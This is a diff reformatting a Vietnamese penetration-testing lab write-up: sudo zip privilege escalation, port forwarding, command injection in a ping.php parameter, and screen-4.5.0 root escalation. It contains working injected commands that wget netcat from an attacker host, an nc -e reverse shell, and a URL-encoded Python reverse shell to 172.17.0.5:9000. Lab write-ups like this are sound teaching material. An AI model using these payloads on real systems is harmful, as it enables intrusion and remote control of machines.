@@ -95,7 +95,7 @@ sudo -l để xem có gì exploit được không:
 ![](./images/media/image49.png)my2user có thể chạy /usr/bin/zip với quyền
 root mà không cần password. Vì thế ta sử dụng một lỗi leo thang quyền
 root qua zip tham khảo từ:
-[[https://gtfobins.github.io/gtfobins/zip/#sudo]{.underline}](https://gtfobins.github.io/gtfobins/zip/#sudo)
+https://gtfobins.github.io/gtfobins/zip/#sudo
 
 ![A computer screen shot of a computer program AI-generated content may
 be incorrect.](./images/media/image52.png)
@@ -159,21 +159,21 @@ ssh -L 8000:172.17.0.3:80 root@192.168.1.46 -p 2222 -i
 id_rsa![](./images/media/image33.png)đã port forward thành công.
 
 Dùng DIRB để scan ra các file ẩn trên web (dirb
-[http://localhost:8000)![](./images/media/image6.png)](about:blank)
+http://localhost:8000)![](./images/media/image6.png)
 
 ta thấy có thư mục /ping đáng để khai thác với note LISTABLE.
 
 Thử truy cập vào
-<http://localhost:8000/ping/>![](./images/media/image48.png)
+http://localhost:8000/ping/![](./images/media/image48.png)
 
 Ta truy cập tiếp
-[http://localhost:8000/ping/For](http://localhost:8000/ping/For-Oscar.*kh%C3%B4ng)-Oscar.txt
+http://localhost:8000/ping/For-Oscar.txt
 ![](./images/media/image29.png)không có gì đáng ngờ với file text này.
 
-Tiếp với <http://localhost:8000/ping/ping.php>
+Tiếp với http://localhost:8000/ping/ping.php
 ![](./images/media/image11.png)Có note hướng dẫn sử dụng param host để
 truy vấn, ta sẽ thử
-<http://localhost:8000/ping/ping.php?host=172.17.0.1> xem sao
+http://localhost:8000/ping/ping.php?host=172.17.0.1 xem sao
 ![](./images/media/image53.png)vậy là web dính command injection, đưa
 tham số vào mà không validate trước khi thực thi nên ta sẽ khai thác
 cách này.
@@ -191,15 +191,12 @@ ta đang khai thác với quyền của www-data)
 attacker để target wget về![](./images/media/image19.png)
 
 Chuỗi injected command để install nc về target:
-[[http://localhost:8000/ping/ping.php?host=]{.underline}](http://localhost:8000/ping/ping.php?host=);
-wget
-[[http://172.17.0.5:9000/nc]{.underline}](http://172.17.0.2:9000/nc)
 
-[[http://localhost:8000/ping/ping.php?host=]{.underline}](http://localhost:8000/ping/ping.php?host=);
-chmod 777 nc
+http://localhost:8000/ping/ping.php?host=; wget http://172.17.0.5:9000/nc
 
-[[http://localhost:8000/ping/ping.php?host=]{.underline}](http://localhost:8000/ping/ping.php?host=);
-ls -la nc; pwd
+http://localhost:8000/ping/ping.php?host=; chmod 777 nc
+
+http://localhost:8000/ping/ping.php?host=; ls -la nc; pwd
 
 note: vì bài lab này được làm trong 2 giai đoạn nên việc khởi động lại
 vm làm xáo trộn ip của các server: 172.17.0.5 là mail, 172.17.0.2 là
@@ -209,9 +206,7 @@ file server, 172.17.0.3 là web server.
 như trên, ta thử dùng nc reverse shell từ target về attacker qua cổng
 9000 xem sao
 
-[[http://localhost:8000/ping/ping.php?host=]{.underline}](http://localhost:8000/ping/ping.php?host=);
-/var/www/html/ping/nc 172.17.0.5 9000 -e
-/bin/bash![](./images/media/image37.png)![](./images/media/image5.png)
+http://localhost:8000/ping/ping.php?host=; /var/www/html/ping/nc 172.17.0.5 9000 -e /bin/bash![](./images/media/image37.png)![](./images/media/image5.png)
 
 không có điều gì xảy ra, có thể version netcat này không hỗ trợ option
 -e hoặc có restrictions về shell execution.
@@ -235,7 +230,7 @@ subprocess.call(\[\"/bin/sh\",\"-i\"\])\' \# Spawn interactive shell
 
 Chuyển thành url:
 
-[[http://localhost:8000/ping/ping.php?host=;%20python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22172.17.0.5%22,9000));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(\[%22/bin/sh%22,%22-i%22\])%27]{.underline}](http://localhost:8000/ping/ping.php?host=;%20python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22172.17.0.5%22,9000));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(%5B%22/bin/sh%22,%22-i%22%5D)%27)
+http://localhost:8000/ping/ping.php?host=;%20python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22172.17.0.5%22,9000));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([%22/bin/sh%22,%22-i%22])%27
 
 ![](./images/media/image54.png)reverse thành công!
 
@@ -360,13 +355,12 @@ ta tìm được /usr/bin/screen-4.5.0 với quyền root, có thể khai thác 
 vào root của datacenter
 
 ta có script exploit:
-[[https://www.exploit-db.com/raw/41154]{.underline}](https://www.exploit-db.com/raw/41154)
+https://www.exploit-db.com/raw/41154
 
 ý tưởng: lợi dụng SUID binary chạy với quyền root, tự động thêm thư viện
 mã độc vào để leo quyền thành root
 
-![](./images/media/image57.png)![](./images/media/image13.png){width="6.5in"
-height="3.3472222222222223in"}
+![](./images/media/image57.png)![](./images/media/image13.png)
 
 ta đã có quyền root
 
